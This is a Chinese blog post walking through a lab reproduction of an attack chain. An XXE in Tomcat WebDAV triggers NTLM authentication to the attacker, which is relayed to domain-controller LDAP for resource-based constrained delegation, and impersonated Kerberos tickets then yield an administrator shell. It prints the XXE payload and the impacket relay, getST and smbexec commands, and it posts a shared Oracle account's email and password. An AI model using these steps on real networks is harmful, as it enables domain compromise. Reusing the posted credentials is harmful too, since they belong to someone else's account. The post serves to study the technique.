---
title: "XXE到域控复现(基于资源的约束委派)"
date: 2020-12-12T12:50:28+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---


奇安信Ateam文章地址：[XXE to 域控](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#4-xxe-to-%E5%9F%9F%E6%8E%A7)
<!--more-->

# 概述
本文主要复现该文章中XXE中继的部分，主要利用的技术为通过XXE实现NTLM中继从而添加基于资源约束委派，最后拿到webdav的TGS票据。

一是对上文《Kerberos协议之基于资源的约束委派》的一个实战场景的讲解，二是加深对于资源约束委派的理解。

# 环境搭建
1. 域控DC 172.16.33.12
2. 目标机器DM2012 172.16.33.33
3. 攻击机Kali 172.16.33.99
4. 一个普通域账号 jack@test.local
5. 其他机器 DM 172.16.33.8

webdav环境由jdk8u202和tomcat5.0.28

下载地址：
1. Tomcat5.0.28 https://archive.apache.org/dist/tomcat/tomcat-5/v5.0.28/bin/jakarta-tomcat-5.0.28.zip
2. JDK8u202 https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
3. Oracle账号 2696671285@qq.com 密码：Oracle123 来自[老鼠拧刀满街找猫csdn](https://blog.csdn.net/LinBilin_/article/details/50217541)

tomcat5自带了webdav，将搭建在dm2012目标机器上。配置好JAVA_HOME的环境变量之后，通过`PsExec64.exe -i -s cmd`以system权限启动tomcat。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9bfc52a1-2809-c994-3643-2886af354860.png)

# 复现
通过OPTIONS请求探测支持的请求方式
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9a237058-7759-101a-c41a-f1b730a2322e.png)

通过PROPFIND方法触发XXE
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/093f2fbf-4d8b-3da4-74c8-78ace53cbe61.png)

```
PROPFIND /webdav/ HTTP/1.1
Host: 172.16.33.33:8080
Content-Length: 247

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE propertyupdate [
<!ENTITY loot SYSTEM "http://172.16.33.99/"> ]>
<D:propertyupdate xmlns:D="DAV:"><D:set><D:prop>
<a xmlns="http://172.16.33.99/">&loot;</a>
</D:prop></D:set></D:propertyupdate>
```

因为java`sun.net.www.protocol.http.HttpURLConnection`类在响应401时，会根据响应判断使用哪种认证模式，这个时候我们可以返回要求使用ntlm认证，这样拿到目标机器的ntlm hash(参见[Ghidra 从 XXE 到 RCE](https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/))，继而通过中继其ntlm链接域控ldap添加基于资源的约束委派（我改我自己）。

而基于资源的约束委派还需要一个服务账户，我们可以通过Powermad来添加。而通过powermad添加就需要走Kerberos认证，即需要一个普通域账户Jack。

以域账户jack运行powermad添加机器账号，密码`test123`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/e9271a8b-9c02-927a-6f41-0e965983ae47.png)

在域控上已经添加了该账户
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/e26c85da-e335-f3ae-7ff0-8ab0de8650b6.png)

此时我们需要通过ntlm中继实现`evilpc$`到`dm2012$`的传入信任关系，即设置`evilpc$`到`dm2012$`的资源约束委派。这个资源约束委派是在`dm2012$`上设置的，是我们通过ntlm中继`dm2012$`链接到域控的ldap设置的。

impacket启动ntlm中继

```
impacket-ntlmrelayx -t ldap://dc.test.local -debug -ip 172.16.33.99 --delegate-access --escalate-user evilpc\$
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/248b8ee4-ee9e-7013-3ce9-1f9aecb204e1.png)

触发xxe之后中继成功修改委派。接着模拟administrator申请高权限票据，然后ptt就完事了。

```
python3 getST.py -dc-ip dc.test.local test/evilpc\$:test123 -spn cifs/dm2012.test.local -impersonate administrator
export KRB5CCNAME=administrator.ccache
python3 smbexec.py -no-pass -k dm2012.test.local
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b82f0d9f-3700-5f56-b2b6-0052c7ec1689.png)

复现过程中碰到了`[-] Exception in HTTP request handler: invalid server address`的错误，解决办法是dns解析的问题，修改`/etc/resolv.conf`加上一行`nameserver 172.16.33.12`，让kali也能解析test.local域名就可以了。

# 总结
基于资源的约束委派利用条件：

1. 拥有一个任意的服务账户1或者计算机账户1(`evilpc$`)，如果没有，可以滥用普通域账户jack的MachineAccountQuota。
2. 获得服务账户2的LDAP权限，文中采用的ntlm中继
3. 配置服务1对服务2的约束委派
4. 发起S4U2Proxy申请高权限票据进行ptt

相比于传统约束委派，信任关系的传入传出方向不同，设置的对象不同。


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**